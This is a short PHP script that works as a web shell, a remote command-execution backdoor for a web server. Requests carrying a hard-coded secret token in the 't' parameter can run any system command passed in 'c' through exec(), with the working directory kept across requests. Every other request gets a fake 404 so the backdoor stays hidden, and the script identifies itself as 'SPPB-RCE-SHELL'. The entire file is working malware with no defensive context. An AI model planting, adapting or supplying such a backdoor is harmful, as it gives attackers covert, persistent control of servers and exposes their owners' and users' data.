<?php
session_start();
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}
function exec_cmd($cmd) {
    global $_SESSION;
    if (strpos($cmd, 'cd ') === 0) {
        $dir = trim(substr($cmd, 3));
        if (empty($dir)) {
            $dir = $_SERVER['HOME'] ?? '/';
        }
        if (@chdir($dir)) {
            $_SESSION['cwd'] = getcwd();
            return "Changed directory to: " . $_SESSION['cwd'] . "
";
        } else {
            return "Error: Cannot change directory to: " . $dir . "
";
        }
    }
    @chdir($_SESSION['cwd']);
    $output = [];
    $return_var = 0;
    exec($cmd . " 2>&1", $output, $return_var);
    $_SESSION['cwd'] = getcwd();
    return implode("
", $output) . ($return_var ? "
[!] Command returned: " . $return_var : "");
}
if (($_GET["t"] ?? "") === "puqvicbizzumsruu") {
    if (isset($_GET["c"])) {
        echo exec_cmd($_GET["c"]);
    } else {
        echo "SPPB-RCE-SHELL";
    }
} else {
    http_response_code(404);
}
?>